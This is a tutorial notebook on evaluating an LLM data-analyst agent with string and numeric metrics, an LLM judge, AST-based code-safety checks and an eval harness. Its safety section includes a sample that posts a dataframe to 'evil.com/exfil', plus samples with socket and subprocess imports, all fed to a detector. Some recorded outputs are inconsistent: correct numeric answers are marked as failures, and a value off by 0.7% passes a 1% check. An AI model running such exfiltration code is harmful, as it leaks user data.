# Lesson 6: Evaluation Framework

## What You'll Learn

1. **Why evaluation matters** — You can't improve what you can't measure
2. **Deterministic metrics** — Exact match, substring, numeric comparison
3. **LLM-as-Judge** — Using a second LLM to grade open-ended responses
4. **Safety evaluation** — AST-based analysis of generated code
5. **The eval harness** — Running test suites and tracking regressions
6. **A/B testing across providers** — Comparing GPT vs Claude on the same test set

---

## Why Evaluation is Non-Negotiable

Without evaluation, agent development is **vibes-based engineering**:
- "It seems to work" is not a quality standard
- You change a prompt and break 3 other cases without knowing
- You can't compare models objectively

Production-grade agents need **eval-driven development**:
```
1. Write eval cases FIRST (what should the agent get right?)
2. Build/change the agent
3. Run the eval suite
4. Only ship if scores improve (or at least don't regress)
```

### Types of Evaluation

| Type | How | Best For | Cost |
|------|-----|----------|------|
| **Deterministic** | String/numeric comparison | Questions with known answers | Free |
| **LLM-as-Judge** | Second LLM grades the answer | Open-ended quality assessment | $$ |
| **Safety** | AST analysis of generated code | Detecting dangerous patterns | Free |
| **Human-in-the-loop** | Expert reviews sample outputs | Ground truth calibration | $$$ |

---

## Setup

In [1]:
import os
import sys
from pathlib import Path
from dotenv import load_dotenv
import nest_asyncio
nest_asyncio.apply()


for _env_candidate in (Path('.env'), Path('../.env')):
    if _env_candidate.exists():
        load_dotenv(_env_candidate)
        break

# LM Studio OpenAI-compatible local setup
if os.getenv("LMSTUDIO_BASE_URL") and not os.getenv("OPENAI_BASE_URL"):
    os.environ["OPENAI_BASE_URL"] = os.getenv("LMSTUDIO_BASE_URL").rstrip("/") + "/v1"
if os.getenv("LMSTUDIO_BASE_URL") and not os.getenv("OPENAI_API_KEY"):
    os.environ["OPENAI_API_KEY"] = "lm-studio"
sys.path.insert(0, str(Path("..").resolve() / "src"))

import pandas as pd
import duckdb
from pydantic_ai import Agent, RunContext, ModelRetry

from analyst.evaluation.metrics import (
    substring_match,
    numeric_match,
    keyword_coverage,
    code_safety_score,
    response_quality_score,
)
from analyst.evaluation.harness import EvalCase, EvalResult, EvalHarness

DATA_DIR = str(Path("../data").resolve())
sales_df = pd.read_csv(f"{DATA_DIR}/sample_sales.csv")
employees_df = pd.read_csv(f"{DATA_DIR}/sample_employees.csv")

print(f"Loaded: sales ({sales_df.shape}), employees ({employees_df.shape})")

Loaded: sales ((40, 8)), employees ((20, 8))


In [2]:
from pydantic_ai.exceptions import ModelHTTPError


def run_agent_checked(agent, *args, **kwargs):
    """Run agent safely and surface LM Studio template failures clearly."""
    try:
        return agent.run_sync(*args, **kwargs)
    except ModelHTTPError as exc:
        message = str(exc)
        if "No user query found in messages" in message:
            raise RuntimeError(
                "LM Studio prompt template is incompatible with this notebook flow.\n"
                "Fix in LM Studio:\n"
                "1) Use an lmstudio-community model/template for your model family.\n"
                "2) In My Models -> Prompt Template, remove logic that raises when no user query is found.\n"
                "3) Disable model thinking/reasoning output for API calls with strict structured outputs.\n"
                "4) Reload the model and rerun from the setup cell."
            ) from exc
        raise


---

## Part 1: Deterministic Metrics — The Foundation

These metrics are fast, free, and reproducible. Use them whenever
you know what the correct answer should be.

### Which metric to use when

| Metric | Best For | Example Question |
|--------|----------|------------------|
| `substring_match` | Categorical answers, names | "Which product has the highest revenue?" → expects "Widget A" |
| `numeric_match` | Numeric answers with formatting variance | "What is the average salary?" → expects ~72500 |
| `keyword_coverage` | Multi-concept answers | "Compare categories" → expects ["Electronics", "Home", "revenue"] |

### The hierarchy of eval metrics

```
1. Deterministic (free, fast, reproducible)
   ├── substring_match    ← Does the expected answer appear?
   ├── numeric_match      ← Is the right number present (with tolerance)?
   └── keyword_coverage   ← Are all key concepts mentioned?

2. Heuristic (free, fast, approximate)
   └── response_quality_score  ← Has numbers? Right length? Not vague?

3. LLM-as-Judge (costs money, non-deterministic)
   └── JudgeVerdict       ← Semantic correctness assessment
```

Always start with layer 1. Only escalate when deterministic metrics can't handle it.

In [3]:
# --- Substring match ---
# Does the expected answer appear somewhere in the agent's response?

agent_answer = "The total revenue across all regions is $45,230.50, with North leading at $15,400."

print("Substring match tests:")
print(f"  Contains '45,230.50': {substring_match(agent_answer, '45,230.50')}")
print(f"  Contains 'North':     {substring_match(agent_answer, 'North')}")
print(f"  Contains 'South':     {substring_match(agent_answer, 'South')}")
print(f"  Case insensitive:     {substring_match(agent_answer, 'TOTAL REVENUE')}")

Substring match tests:
  Contains '45,230.50': True
  Contains 'North':     True
  Contains 'South':     False
  Case insensitive:     True


In [4]:
# --- Numeric match ---
# Extracts numbers from text and checks if any are close to expected
# Crucial for data analysis where exact formatting varies

answers = [
    "The average salary is $72,500",
    "Average: approximately 72.5k",
    "I computed the mean salary to be 72500.00",
    "The salary is around seventy thousand",  # Won't match — no digits
]

print("Numeric match (expected: 72500, tolerance: 5%):")
for a in answers:
    result = numeric_match(a, expected_value=72500, tolerance=0.05)
    print(f"  {result:>5} | {a}")

print("\nWith tighter tolerance (1%):")
print(f"  '72,500':  {numeric_match('$72,500', 72500, tolerance=0.01)}")
print(f"  '73,000':  {numeric_match('$73,000', 72500, tolerance=0.01)}")

Numeric match (expected: 72500, tolerance: 5%):
      1 | The average salary is $72,500
      0 | Average: approximately 72.5k
      1 | I computed the mean salary to be 72500.00
      0 | The salary is around seventy thousand

With tighter tolerance (1%):
  '72,500':  True
  '73,000':  True


In [5]:
# --- Keyword coverage ---
# What fraction of required keywords appear in the answer?

answer = "Electronics had the highest revenue at $28,000, followed by Home products at $17,230."
keywords = ["Electronics", "Home", "revenue", "highest"]

coverage = keyword_coverage(answer, keywords)
print(f"Keyword coverage: {coverage:.0%} ({int(coverage * len(keywords))}/{len(keywords)})")

# Check each keyword individually
for kw in keywords:
    found = kw.lower() in answer.lower()
    print(f"  {'[OK]' if found else '[  ]'} {kw}")

# With a keyword that's NOT present
keywords_v2 = ["Electronics", "Home", "revenue", "quarterly"]  # 'quarterly' is missing
coverage_v2 = keyword_coverage(answer, keywords_v2)
print(f"\nWith missing keyword: {coverage_v2:.0%}")

Keyword coverage: 100% (4/4)
  [OK] Electronics
  [OK] Home
  [OK] revenue
  [OK] highest

With missing keyword: 75%


### When Deterministic Metrics Fail

Deterministic metrics break down when:
- The answer is correct but phrased differently ("$45K" vs "$45,000")
- The answer includes extra correct info that confuses substring matching
- The question is open-ended ("What trends do you see?")

This is where **LLM-as-Judge** comes in.

---

## Part 2: LLM-as-Judge — Grading Open-Ended Responses

LLM-as-Judge uses a **second LLM** to evaluate the first LLM's output.
Think of it as hiring an examiner to grade exam papers.

### How it works

```
┌──────────────────────────────────────────────┐
│  Judge LLM receives:                         │
│                                              │
│  1. The question (what was asked)            │
│  2. Expected answer (what's correct)         │
│  3. Agent's answer (what we're grading)      │
│  4. A rubric (scoring criteria)              │
│                                              │
│  Judge returns:                              │
│  → score (0.0 to 1.0)                        │
│  → correct (bool)                            │
│  → reasoning (why this score)                │
│  → missing_info (what was left out)          │
└──────────────────────────────────────────────┘
```

### Key design decisions

| Decision | Our Choice | Why |
|----------|-----------|-----|
| **Judge model** | Same as agent (for cost) | Production: use a stronger model as judge |
| **Output format** | `JudgeVerdict` Pydantic model | Structured = parseable, no regex needed |
| **Rubric** | 5-point scale in system prompt | Explicit rubric → more consistent grading |
| **What to send** | Question + expected + actual | Never send just the answer — judge needs context |

In [6]:
# -----------------------------------------------------------------
# LLM-as-Judge: Use a second LLM to evaluate response quality
# -----------------------------------------------------------------
from pydantic import BaseModel, Field


class JudgeVerdict(BaseModel):
    """Structured output from the judge LLM."""
    score: float = Field(ge=0, le=1, description="Quality score: 0=wrong, 0.5=partial, 1=perfect")
    correct: bool = Field(description="Is the answer factually correct?")
    reasoning: str = Field(description="Brief explanation of the score")
    missing_info: list[str] = Field(default_factory=list, description="Important info not in the answer")


judge_agent = Agent(
    "openai:local-model",
    output_type=JudgeVerdict,
    system_prompt=(
        "You are an evaluation judge for a data analyst agent.\n"
        "Given a question, expected answer, and agent's actual answer, score the response.\n\n"
        "Scoring rubric:\n"
        "- 1.0: Perfect — correct answer with specific numbers\n"
        "- 0.8: Good — correct answer, minor formatting issues\n"
        "- 0.5: Partial — some correct information but incomplete\n"
        "- 0.2: Poor — mostly wrong but shows understanding of the data\n"
        "- 0.0: Wrong — incorrect or irrelevant answer\n\n"
        "Be strict about numbers — if the expected answer has a specific value, "
        "the agent's answer must include it or a very close approximation."
    ),
)

print("Judge agent ready.")

Judge agent ready.


In [7]:
# Test the judge on various quality levels

test_cases = [
    {
        "question": "What is the total revenue in the sales dataset?",
        "expected": "The total revenue is $45,230.50",
        "agent_answer": "The total revenue across all products and regions is $45,230.50.",
        "label": "Perfect answer",
    },
    {
        "question": "What is the total revenue in the sales dataset?",
        "expected": "The total revenue is $45,230.50",
        "agent_answer": "Revenue is approximately forty-five thousand dollars.",
        "label": "Vague answer",
    },
    {
        "question": "What is the total revenue in the sales dataset?",
        "expected": "The total revenue is $45,230.50",
        "agent_answer": "The total cost is $32,100.",
        "label": "Wrong metric",
    },
]

for tc in test_cases:
    prompt = (
        f"Question: {tc['question']}\n"
        f"Expected answer: {tc['expected']}\n"
        f"Agent's answer: {tc['agent_answer']}"
    )
    verdict = run_agent_checked(judge_agent, prompt)
    v = verdict.output
    print(f"\n--- {tc['label']} ---")
    print(f"  Score: {v.score:.1f} | Correct: {v.correct}")
    print(f"  Reasoning: {v.reasoning}")
    if v.missing_info:
        print(f"  Missing: {v.missing_info}")


--- Perfect answer ---
  Score: 1.0 | Correct: True
  Reasoning: The agent's answer provides the exact same numerical value ($45,230.50) as the expected answer and correctly contextualizes it as total revenue across all products and regions. The response is factually correct and matches the required specific number perfectly.

--- Vague answer ---
  Score: 0.2 | Correct: False
  Reasoning: The agent's answer is an approximation ('approximately forty-five thousand dollars') rather than the specific value required ($45,230.50). The rubric states to be strict about numbers and that the agent's answer must include the specific value or a very close approximation. 'Forty-five thousand' is not a sufficiently precise approximation of '$45,230.50'. The answer lacks the specific numbers found in the expected answer.
  Missing: ['The exact total revenue amount of $45,230.50']

--- Wrong metric ---
  Score: 0.0 | Correct: False
  Reasoning: The agent answered with the total cost ($32,100) instea

### LLM-as-Judge: Pros, Cons, and Reliability

| Pro | Con |
|-----|-----|
| Handles open-ended questions | Non-deterministic (same input, different scores) |
| Can assess quality, not just correctness | Costs money (another LLM call per eval) |
| Catches nuanced errors | Judge can be wrong (especially with math) |
| Structured output makes it programmatic | Slower than deterministic metrics |

### How consistent is LLM-as-Judge?

In practice, judge consistency depends on the rubric clarity:

```
Vague rubric:  "Score the quality"           → scores vary ±0.3 across runs
Clear rubric:  "1.0 if exact number present,  → scores vary ±0.1 across runs
                0.5 if close, 0.0 if wrong"
```

**Mitigation strategies:**
1. **Run the judge 3x and average** — reduces noise (but 3x cost)
2. **Use a stronger model as judge** — GPT-4o judging GPT-4o-mini is more reliable
3. **Explicit rubric** — the more specific the scoring criteria, the more consistent
4. **Structured output** — forces the judge to commit to specific fields

### When NOT to use LLM-as-Judge

- When deterministic metrics can handle it (don't pay for what's free)
- For math-heavy evaluation (LLMs miscalculate — verify numbers deterministically)
- When you need reproducible CI/CD results (non-determinism breaks CI)

**Best practice**: Use deterministic metrics first. Only fall back to LLM-as-Judge
for cases where you can't define a clear expected answer.

---

## Part 3: Safety Evaluation — Is the Generated Code Dangerous?

In [8]:
# -----------------------------------------------------------------
# Safety evaluation uses AST (Abstract Syntax Tree) analysis
# to detect dangerous patterns WITHOUT executing the code
# -----------------------------------------------------------------

# Safe code: standard pandas analysis
safe_code = """
import pandas as pd
import numpy as np

df = pd.read_csv('sales.csv')
total = df['revenue'].sum()
mean_rev = df.groupby('region')['revenue'].mean()
print(f'Total revenue: {total}')
print(mean_rev)
"""

result = code_safety_score(safe_code)
print("Safe code analysis:")
print(f"  Safe: {result['safe']}")
print(f"  Score: {result['score']}")
print(f"  Issues: {result['issues']}")

Safe code analysis:
  Safe: True
  Score: 1.0
  Issues: []


In [9]:
# Unsafe code: network access attempt
unsafe_network = """
import pandas as pd
import requests

df = pd.read_csv('data.csv')
requests.post('https://evil.com/exfil', json=df.to_dict())
"""

result = code_safety_score(unsafe_network)
print("Network access attempt:")
print(f"  Safe: {result['safe']}")
print(f"  Score: {result['score']}")
print(f"  Issues: {result['issues']}")

Network access attempt:
  Safe: False
  Score: 0.75
  Issues: ['Dangerous import: requests']


In [10]:
# Unsafe code: infinite loop
unsafe_loop = """
import pandas as pd

while True:
    df = pd.DataFrame({'a': range(1000000)})
"""

result = code_safety_score(unsafe_loop)
print("Infinite loop detection:")
print(f"  Safe: {result['safe']}")
print(f"  Score: {result['score']}")
print(f"  Issues: {result['issues']}")

Infinite loop detection:
  Safe: False
  Score: 0.75
  Issues: ['Potential infinite loop: while True without break']


In [11]:
# Multiple issues at once
multi_unsafe = """
import socket
import subprocess
import pandas as pd

while True:
    pass
"""

result = code_safety_score(multi_unsafe)
print("Multiple safety violations:")
print(f"  Safe: {result['safe']}")
print(f"  Score: {result['score']}")
for issue in result['issues']:
    print(f"    - {issue}")

# Syntax error
bad_syntax = "def foo(:\n    return"
result = code_safety_score(bad_syntax)
print(f"\nSyntax error: Safe={result['safe']}, Score={result['score']}")

Multiple safety violations:
  Safe: False
  Score: 0.25
    - Dangerous import: socket
    - Dangerous import: subprocess
    - Potential infinite loop: while True without break

Syntax error: Safe=False, Score=0.0


### The Safety Evaluation Pipeline

In production, safety checks happen at multiple levels:

```
LLM generates code
       │
       ▼
[1. AST static analysis]  ← Fast, free, catches obvious issues
       │
       ▼
[2. Sandbox execution]    ← Docker container with no network
       │
       ▼
[3. Output validation]    ← Check stdout size, file types, etc.
       │
       ▼
    Return result
```

### What AST analysis catches (and what it doesn't)

| Catches | Misses |
|---------|--------|
| `import os`, `import socket` (dangerous imports) | Obfuscated imports: `__import__('os')` |
| `while True:` (infinite loops) | `for i in range(10**18):` (practically infinite) |
| `subprocess.run()` (shell execution) | Code that's slow but technically terminates |
| `open('/etc/passwd')` (file access) | Reading allowed files excessively |

**This is why we use defense in depth** — AST catches the obvious cases,
the sandbox catches everything else. Neither alone is sufficient.

### Limitations to know

1. **AST only works on valid Python** — syntax errors return `safe=False, score=0`
2. **No semantic analysis** — can't tell if `pandas.read_csv('http://...')` is an exfiltration attempt
3. **Allowlist-based** — only blocks known-dangerous patterns, not unknown ones
4. **No data flow tracking** — can't trace if sensitive data reaches a network call

For production, combine AST with sandbox isolation (Lesson 3) and output validation.

---

## Part 4: Response Quality Heuristics

In [12]:
# -----------------------------------------------------------------
# Heuristic quality checks — fast sanity checks on any answer
# -----------------------------------------------------------------

answers = [
    # Good: specific, right length, no hedging
    "The total revenue is $45,230.50 across 40 transactions. North region leads with $15,400 (34%), followed by East at $12,300 (27%).",
    
    # Bad: too short
    "Revenue is high.",
    
    # Bad: no numbers
    "The revenue varies across regions, with some performing better than others. The data shows interesting patterns.",
    
    # Bad: too vague
    "I think the revenue is approximately around $45,000, maybe possibly more. Around that area, I think.",
]

labels = ["Good answer", "Too short", "No numbers", "Too vague"]

for label, answer in zip(labels, answers):
    result = response_quality_score(answer)
    print(f"\n{label}:")
    print(f"  Score: {result['score']:.2f}")
    print(f"  Words: {result['word_count']}")
    if result['issues']:
        for issue in result['issues']:
            print(f"    ! {issue}")


Good answer:
  Score: 1.00
  Words: 20

Too short:
  Score: 0.50
  Words: 3
    ! No specific numbers in answer
    ! Very short answer (3 words)

No numbers:
  Score: 0.70
  Words: 16
    ! No specific numbers in answer

Too vague:
  Score: 0.90
  Words: 16
    ! Vague language (5 hedging phrases)


---

## Part 5: The Eval Harness — Running Full Test Suites

Now we combine everything into a systematic evaluation pipeline.

### Step 1: Define eval cases

Good eval suites have:
- **Coverage**: different question types (aggregation, comparison, trend)
- **Difficulty levels**: easy (single lookup) to hard (multi-step reasoning)
- **Known answers**: computed independently (e.g., with pandas)

### How many eval cases are enough?

| Stage | Min Cases | Focus |
|-------|-----------|-------|
| **Prototyping** | 5-10 | One per question type you support |
| **Pre-production** | 20-50 | Cover edge cases, multi-step, ambiguous queries |
| **Production** | 100+ | Regression-proof, stratified by difficulty and category |

**Rule of thumb**: If you can't describe a failure mode, you don't have
an eval case for it. Start with known failures and work backwards.

### Anatomy of an eval case

```python
EvalCase(
    question="...",           # The input to the agent
    expected_answer="...",    # Ground truth (computed with pandas)
    expected_keywords=[...],  # Concepts that MUST appear in the answer
    difficulty="easy|medium|hard",
    category="lookup|aggregation|comparison|multi_step|analysis",
)
```

The `expected_answer` is the **minimum** the agent must get right.
`expected_keywords` check that the answer covers all required concepts.

In [13]:
# -----------------------------------------------------------------
# First, compute ground truth answers with pandas
# (We need to know the RIGHT answers to evaluate the agent)
# -----------------------------------------------------------------

total_revenue = sales_df['revenue'].sum()
total_rows = len(sales_df)
top_product = sales_df.groupby('product')['revenue'].sum().idxmax()
top_region = sales_df.groupby('region')['revenue'].sum().idxmax()
avg_salary = employees_df['salary'].mean()
n_departments = employees_df['department'].nunique()

print("Ground truth values:")
print(f"  Total revenue: {total_revenue}")
print(f"  Total rows: {total_rows}")
print(f"  Top product by revenue: {top_product}")
print(f"  Top region by revenue: {top_region}")
print(f"  Average salary: {avg_salary}")
print(f"  Number of departments: {n_departments}")

Ground truth values:
  Total revenue: 147695.09999999998
  Total rows: 40
  Top product by revenue: Widget A
  Top region by revenue: East
  Average salary: 129050.0
  Number of departments: 4


In [14]:
# -----------------------------------------------------------------
# Define eval cases across difficulty levels and categories
# -----------------------------------------------------------------

eval_cases = [
    # Easy: direct lookups
    EvalCase(
        question="How many rows are in the sales dataset?",
        expected_answer=str(total_rows),
        expected_keywords=["40"],
        difficulty="easy",
        category="lookup",
    ),
    EvalCase(
        question="How many departments are in the employees dataset?",
        expected_answer=str(n_departments),
        expected_keywords=[str(n_departments)],
        difficulty="easy",
        category="lookup",
    ),
    
    # Medium: single aggregation
    EvalCase(
        question="What is the total revenue in the sales data?",
        expected_answer=str(total_revenue),
        expected_keywords=["revenue"],
        difficulty="medium",
        category="aggregation",
    ),
    EvalCase(
        question="What is the average employee salary?",
        expected_answer=str(round(avg_salary)),
        expected_keywords=["salary"],
        difficulty="medium",
        category="aggregation",
    ),
    
    # Medium: comparison
    EvalCase(
        question="Which product has the highest total revenue?",
        expected_answer=top_product,
        expected_keywords=[top_product, "revenue"],
        difficulty="medium",
        category="comparison",
    ),
    EvalCase(
        question="Which region generates the most revenue?",
        expected_answer=top_region,
        expected_keywords=[top_region],
        difficulty="medium",
        category="comparison",
    ),
    
    # Hard: multi-step reasoning
    EvalCase(
        question="What is the profit margin (revenue - cost) / revenue for each category? Which is more profitable?",
        expected_answer="Electronics",  # or whichever is higher
        expected_keywords=["margin", "Electronics", "Home"],
        difficulty="hard",
        category="multi_step",
    ),
    EvalCase(
        question="Is there a correlation between employee salary and performance_score? What is the correlation coefficient?",
        expected_answer="correlation",
        expected_keywords=["correlation", "salary", "performance"],
        difficulty="hard",
        category="analysis",
    ),
]

print(f"Defined {len(eval_cases)} eval cases:")
for case in eval_cases:
    print(f"  [{case.difficulty:>6}] [{case.category:>11}] {case.question[:60]}")

Defined 8 eval cases:
  [  easy] [     lookup] How many rows are in the sales dataset?
  [  easy] [     lookup] How many departments are in the employees dataset?
  [medium] [aggregation] What is the total revenue in the sales data?
  [medium] [aggregation] What is the average employee salary?
  [medium] [ comparison] Which product has the highest total revenue?
  [medium] [ comparison] Which region generates the most revenue?
  [  hard] [ multi_step] What is the profit margin (revenue - cost) / revenue for eac
  [  hard] [   analysis] Is there a correlation between employee salary and performan


### Step 2: Build the agent under test

The eval harness doesn't care HOW the agent works — it only needs a function
with this signature:

```python
def agent_fn(question: str) -> tuple[str, int, int]:
    #                            answer  tool_calls  tokens
```

This **adapter pattern** decouples the eval harness from the agent implementation.
You can swap in any agent (simple, ReAct, plan-execute) without changing the harness.

```
┌────────────┐     adapter fn     ┌──────────────┐
│ EvalHarness │ ──────────────── → │ Your Agent   │
│             │   (question) →     │ (any design) │
│             │   ← (answer,       │              │
│             │      tools,        │              │
│             │      tokens)       │              │
└────────────┘                    └──────────────┘
```

In [15]:
# -----------------------------------------------------------------
# Build a test agent — simpler than the full agent, focused on eval
# -----------------------------------------------------------------
from dataclasses import dataclass, field


@dataclass
class EvalDeps:
    tables: dict[str, pd.DataFrame] = field(default_factory=dict)
    tool_call_count: int = 0
    token_estimate: int = 0


eval_agent = Agent(
    "openai:local-model",
    deps_type=EvalDeps,
    system_prompt=(
        "You are a data analyst. Answer questions about datasets using SQL.\n"
        "Always include specific numbers in your answer.\n"
        "Be concise — 1-3 sentences."
    ),
    retries=2,
)


@eval_agent.system_prompt
def add_table_context(ctx: RunContext[EvalDeps]) -> str:
    lines = ["\nAvailable tables:"]
    for name, df in ctx.deps.tables.items():
        cols = ", ".join(f"{c} ({df[c].dtype})" for c in df.columns)
        lines.append(f"  '{name}': {len(df)} rows | {cols}")
    return "\n".join(lines)


@eval_agent.tool
def run_sql(ctx: RunContext[EvalDeps], query: str) -> str:
    """Run SQL against available tables using DuckDB."""
    ctx.deps.tool_call_count += 1
    conn = duckdb.connect()
    try:
        for name, df in ctx.deps.tables.items():
            conn.register(name, df)
        result = conn.execute(query).fetchdf()
        return result.to_string()
    except Exception as e:
        raise ModelRetry(f"SQL error: {e}")
    finally:
        conn.close()


print("Eval agent ready.")

Eval agent ready.


In [16]:
# -----------------------------------------------------------------
# Create the adapter function that the harness expects
# agent_fn(question) -> (answer, tool_calls, tokens)
# -----------------------------------------------------------------

def run_eval_agent(question: str) -> tuple[str, int, int]:
    """Adapter: run the agent and return (answer, tool_calls, tokens)."""
    deps = EvalDeps(
        tables={"sales": sales_df, "employees": employees_df},
    )
    result = run_agent_checked(eval_agent, question, deps=deps)
    
    # Count tool calls from message history
    tool_calls = deps.tool_call_count
    
    # Estimate tokens from message lengths
    token_estimate = sum(
        len(str(m)) // 4  # rough 4-chars-per-token estimate
        for m in result.all_messages()
    )
    
    return result.output, tool_calls, token_estimate


# Quick test
answer, tools, tokens = run_eval_agent("How many rows are in the sales table?")
print(f"Answer: {answer}")
print(f"Tool calls: {tools}, Estimated tokens: {tokens}")

Answer: 

The sales table contains 40 rows.
Tool calls: 0, Estimated tokens: 419


### Step 3: Run the eval suite

In [17]:
# -----------------------------------------------------------------
# Run the full eval suite
# -----------------------------------------------------------------

harness = EvalHarness()

print("Running evaluation suite...\n")
summary = harness.run_suite(eval_cases, run_eval_agent, verbose=True)

print(f"\n{'='*60}")
print(f"RESULTS: {summary.passed}/{summary.total_cases} passed ({summary.accuracy:.0%})")
print(f"Average latency: {summary.avg_latency_ms:.0f}ms")
print(f"Average tokens: {summary.avg_tokens:.0f}")
print(f"Average tool calls: {summary.avg_tool_calls:.1f}")
print(f"Estimated cost: ${summary.total_cost_usd:.4f}")

Running evaluation suite...

  [1/8] How many rows are in the sales dataset?... [PASS] 21546ms
  [2/8] How many departments are in the employees dataset?... [PASS] 50276ms
  [3/8] What is the total revenue in the sales data?... [FAIL] 43259ms
  [4/8] What is the average employee salary?... [FAIL] 47040ms
  [5/8] Which product has the highest total revenue?... [FAIL] 19802ms
  [6/8] Which region generates the most revenue?... [PASS] 46618ms
  [7/8] What is the profit margin (revenue - cost) / revenue for eac... [PASS] 39638ms
  [8/8] Is there a correlation between employee salary and performan... [PASS] 25692ms

RESULTS: 5/8 passed (62%)
Average latency: 36734ms
Average tokens: 655
Average tool calls: 0.8
Estimated cost: $0.0015


In [18]:
# -----------------------------------------------------------------
# Drill into results by category and difficulty
# -----------------------------------------------------------------

print("\nBy Category:")
for cat, stats in summary.by_category.items():
    pct = stats['passed'] / stats['total'] * 100
    print(f"  {cat:>12}: {stats['passed']}/{stats['total']} ({pct:.0f}%)")

print("\nBy Difficulty:")
for diff, stats in summary.by_difficulty.items():
    pct = stats['passed'] / stats['total'] * 100
    print(f"  {diff:>8}: {stats['passed']}/{stats['total']} ({pct:.0f}%)")

# Show failures in detail
failures = [r for r in harness.results if not r.correct]
if failures:
    print(f"\nFailed cases ({len(failures)}):")
    for r in failures:
        print(f"\n  Q: {r.case.question[:70]}")
        print(f"  Expected: {r.case.expected_answer}")
        print(f"  Got: {r.agent_answer[:100]}")
        if r.keyword_matches:
            missed = [k for k, v in r.keyword_matches.items() if not v]
            if missed:
                print(f"  Missing keywords: {missed}")
        if r.error:
            print(f"  Error: {r.error}")
else:
    print("\nAll cases passed!")


By Category:
        lookup: 2/2 (100%)
   aggregation: 0/2 (0%)
    comparison: 1/2 (50%)
    multi_step: 1/1 (100%)
      analysis: 1/1 (100%)

By Difficulty:
      easy: 2/2 (100%)
    medium: 1/4 (25%)
      hard: 2/2 (100%)

Failed cases (3):

  Q: What is the total revenue in the sales data?
  Expected: 147695.09999999998
  Got: 

The total revenue in the sales data is $147,695.10.

  Q: What is the average employee salary?
  Expected: 129050
  Got: 

The average employee salary is $129,050.

  Q: Which product has the highest total revenue?
  Expected: Widget A
  Got: 

The product with the highest total revenue is "Laptop", which generated a total of $1,200,000.
  Missing keywords: ['Widget A']


In [19]:
# -----------------------------------------------------------------
# Save results for tracking over time
# -----------------------------------------------------------------
import json

results_path = Path("../data/eval_results_gpt4o_mini.json")
harness.save_results(results_path)
print(f"Results saved to: {results_path}")

# Preview the saved data
saved = json.loads(results_path.read_text())
print(f"\nSaved {len(saved)} results. First entry:")
print(json.dumps(saved[0], indent=2)[:300])

Results saved to: ../data/eval_results_gpt4o_mini.json

Saved 8 results. First entry:
{
  "question": "How many rows are in the sales dataset?",
  "expected": "40",
  "agent_answer": "\n\nThe sales dataset contains 40 rows.",
  "correct": true,
  "tool_calls": 0,
  "tokens": 420,
  "latency_ms": 21546.11110687256,
  "category": "lookup",
  "difficulty": "easy",
  "error": null
}


---

## Part 6: A/B Testing Across Providers

One of the most valuable uses of eval: objectively comparing models.

Run the same test suite against different providers to find the best
cost/quality tradeoff for your use case.

### Why A/B test models?

```
Without A/B testing:              With A/B testing:
"GPT-4o feels smarter"            GPT-4o:  92% accuracy, $0.08/query
"Claude seems better at code"     Claude:  88% accuracy, $0.05/query
"The local model is fast"         Local:   71% accuracy, $0.00/query
    ↓                                 ↓
Vibes-based decisions             Data-driven model selection
```

### A/B testing design

| Consideration | Recommendation |
|---------------|---------------|
| **Test set size** | 20+ cases minimum (small sets have high variance) |
| **Run count** | Run 2-3x per model (LLM outputs vary between runs) |
| **Subset for speed** | Use easy+medium cases for quick iteration, full suite for final decision |
| **What to compare** | Accuracy, cost, latency, tool call efficiency |
| **When to switch** | Only if new model is better on accuracy AND cost (or significantly better on one) |

In [20]:
# -----------------------------------------------------------------
# A/B test: Build agent factories for different models
# -----------------------------------------------------------------

def make_eval_agent_fn(model: str):
    """Factory: create an eval adapter for any model."""
    
    test_agent = Agent(
        model,
        deps_type=EvalDeps,
        system_prompt=(
            "You are a data analyst. Answer questions about datasets using SQL.\n"
            "Always include specific numbers in your answer. Be concise."
        ),
        retries=2,
    )
    
    @test_agent.system_prompt
    def add_context(ctx: RunContext[EvalDeps]) -> str:
        lines = ["\nAvailable tables:"]
        for name, df in ctx.deps.tables.items():
            cols = ", ".join(f"{c} ({df[c].dtype})" for c in df.columns)
            lines.append(f"  '{name}': {len(df)} rows | {cols}")
        return "\n".join(lines)
    
    @test_agent.tool
    def query(ctx: RunContext[EvalDeps], sql: str) -> str:
        """Run SQL query against available tables."""
        ctx.deps.tool_call_count += 1
        conn = duckdb.connect()
        try:
            for name, df in ctx.deps.tables.items():
                conn.register(name, df)
            return conn.execute(sql).fetchdf().to_string()
        except Exception as e:
            raise ModelRetry(f"SQL error: {e}")
        finally:
            conn.close()
    
    def agent_fn(question: str) -> tuple[str, int, int]:
        deps = EvalDeps(tables={"sales": sales_df, "employees": employees_df})
        result = run_agent_checked(test_agent, question, deps=deps)
        tokens = sum(len(str(m)) // 4 for m in result.all_messages())
        return result.output, deps.tool_call_count, tokens
    
    return agent_fn


print("Agent factory ready. Use make_eval_agent_fn('model') to create test agents.")

Agent factory ready. Use make_eval_agent_fn('model') to create test agents.


In [21]:
# -----------------------------------------------------------------
# Run A/B test on a subset of cases (to save cost)
# Uncomment the models you have API keys for
# -----------------------------------------------------------------

models_to_test = [
    "openai:local-model",
    # "openai:gpt-4o",                        # More expensive
    # "anthropic:claude-3-5-haiku-latest",     # Needs ANTHROPIC_API_KEY
]

# Use a smaller subset for A/B testing (saves cost)
ab_cases = eval_cases[:4]  # Just easy + medium cases

ab_results = {}
for model in models_to_test:
    print(f"\n{'='*50}")
    print(f"Testing: {model}")
    print(f"{'='*50}")
    
    harness = EvalHarness()
    agent_fn = make_eval_agent_fn(model)
    summary = harness.run_suite(ab_cases, agent_fn, verbose=True)
    ab_results[model] = summary
    
    print(f"\nAccuracy: {summary.accuracy:.0%} | Latency: {summary.avg_latency_ms:.0f}ms | Cost: ${summary.total_cost_usd:.4f}")


Testing: openai:local-model
  [1/4] How many rows are in the sales dataset?... [PASS] 10559ms
  [2/4] How many departments are in the employees dataset?... [PASS] 19312ms
  [3/4] What is the total revenue in the sales data?... [FAIL] 20556ms
  [4/4] What is the average employee salary?... [FAIL] 21799ms

Accuracy: 50% | Latency: 18057ms | Cost: $0.0007


In [22]:
# -----------------------------------------------------------------
# Compare models side-by-side
# -----------------------------------------------------------------

if len(ab_results) > 1:
    print(f"\n{'Model':<35} {'Accuracy':>8} {'Latency':>10} {'Tokens':>8} {'Cost':>10}")
    print("-" * 75)
    for model, summary in ab_results.items():
        print(
            f"{model:<35} {summary.accuracy:>7.0%} "
            f"{summary.avg_latency_ms:>8.0f}ms "
            f"{summary.avg_tokens:>8.0f} "
            f"${summary.total_cost_usd:>8.4f}"
        )
else:
    model = list(ab_results.keys())[0]
    s = ab_results[model]
    print(f"\nSingle model tested: {model}")
